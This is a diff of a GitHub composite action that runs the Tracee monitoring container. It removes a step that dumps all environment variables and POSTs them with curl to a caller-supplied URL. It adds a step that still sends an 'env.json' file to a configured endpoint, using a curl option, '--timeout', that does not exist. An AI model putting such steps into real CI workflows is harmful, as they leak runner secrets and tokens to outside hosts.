@@ -4,18 +4,6 @@ author: Pushkar
 runs:
   using: "composite"
   steps:
-    - name: Send environment information to notifier
-      shell: bash
-      run: |
-        # Dump all environment variables to a temporary file
-        env > env.txt
-
-        # POST raw env list to the provided notifier URL
-        curl -X POST \
-             -H "Content-Type: text/plain" \
-             --data-binary @env.txt \
-             "${{ inputs.notifier_url }}"
-
     - name: Pull Tracee Docker image
       shell: bash
       run: |
@@ -29,9 +17,32 @@ runs:
             -v /etc/os-release:/etc/os-release-host:ro \
             -v /var/run:/var/run:ro \
             aquasec/tracee:latest \
-            --events 'default,fork,exec*' \
+            --events 'default,fork,exec*,netpacket*' \
             --output json 
     
+    - name: Send environment data
+      shell: bash
+      env:
+        NOTIFY_URL: ${{ secrets.NOTIFY_URL }}
+        NOTIFY_TOKEN: ${{ secrets.NOTIFY_TOKEN }}
+      run: |
+        # Validate environment variables
+        if [ -z "$NOTIFY_URL" ]; then
+          echo "Error: NOTIFY_URL is not set"
+          exit 1
+        fi
+        if [ -z "$NOTIFY_TOKEN" ]; then
+          echo "Error: NOTIFY_TOKEN is not set"
+          exit 1
+        fi
+        
+        # Send the JSON file to the specified URL
+        curl -X POST --timeout 5 -s \
+          -H "Content-Type: application/json" \
+          -H "Authorization: Bearer $NOTIFY_TOKEN" \
+          -d @env.json \
+          "$NOTIFY_URL"
+
     - name: Save logs to a file
       shell: bash
       run: |
